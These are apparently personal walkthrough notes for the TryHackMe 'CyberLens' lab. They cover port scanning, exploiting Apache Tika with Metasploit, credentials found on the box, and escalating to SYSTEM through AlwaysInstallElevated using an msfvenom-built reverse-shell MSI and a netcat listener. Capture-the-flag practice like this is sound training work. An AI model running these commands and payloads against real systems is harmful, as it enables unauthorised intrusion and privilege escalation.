https://tryhackme.com/r/room/cyberlensp6
<code>
### Enumeration Services

┌──(duke㉿kali)-[~/Documents/THM_CyberLens]
└─$ nmap  -sV -p-   cyberlens.thm
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-22 04:57 CDT
Nmap scan report for cyberlens.thm (10.10.136.194)
Host is up (0.032s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 219.74 seconds

## Found exploit for Jetty 8.y.z-SNAPSHOT - Apache Tika 1.17
use Metasploit to get reverse shell



Apache24\conf\extra\httpd-ssl.conf:228:#     file needs this password: `xxj31ZMTZzkVA'.


### Found credentials for user CyberLens
C:\Users\CyberLens\Documents\Management>more CyberLens-Management.txt
more CyberLens-Management.txt
Remember, manual enumeration is often key in an engagement ;)


RDP ::


CyberLens
HackSmarter123



C:\Users\CyberLens\Documents\Management>


  [+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!




### Enumeration Services via metasploid

msf6 post(windows/gather/enum_services) > run session=1

[*] Listing Service Info for matching services, please wait...
[+] New service credential detected: AJRouter is running as 'NT AUTHORITY\LocalService'
[+] New service credential detected: AmazonSSMAgent is running as 'LocalSystem'
[+] New service credential detected: CryptSvc is running as 'NT Authority\NetworkService'
[*] Found 205 Windows services matching filters

Services
========

 Name                                      Credentials                  Command   Startup
 ----                                      -----------                  -------   -------
 AJRouter                                  NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
 ALG                                       NT AUTHORITY\LocalService    Manual    C:\Windows\System32\alg.exe
 AWSLiteAgent                              LocalSystem                  Auto      "C:\Program Files\Amazon\XenTools\LiteAgent.exe"
 AmazonSSMAgent                            LocalSystem                  Auto      "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
 AppIDSvc                                  NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
 AppMgmt                                   LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
 AppReadiness                              LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k AppReadiness -p
 AppVClient                                LocalSystem                  Disabled  C:\Windows\system32\AppVClient.exe

## PrivEsc

### Found AlwaysInstallElevated “lazy admin” misconfiguration known as AlwaysInstallElevated.

AlwaysInstallElevated is a functionality that offers ALL users on a Windows operating system the ability to automatically run any MSI file with elevated privileges.

PS C:\Users\CyberLens\Desktop\PowerSploit\Privesc> Get-RegistryAlwaysInstallElevated
True
PS C:\Users\CyberLens\Desktop\PowerSploit\Privesc> Get-RegistryAutoLogon


DefaultDomainName    : CHANGE-MY-HOSTN
DefaultUserName      : CyberLens
DefaultPassword      :
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
### Create reverseshell installer                                                                                                                                                                                                                                            
┌──(duke㉿kali)-[~/Documents/THM_CyberLens]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.30.202 LPORT=4433 -a x64 --platform Windows -f msi -o evil.msi
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: evil.msi
                                                                                                                                         
### Run listener
└─$ nc -lvnp 4433                
listening on [any] 4433 ...

### run installer

connect to [10.9.30.202] from (UNKNOWN) [10.10.174.109] 49875
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.


C:\Windows\system32>whoami
whoami
nt authority\system




<\code>
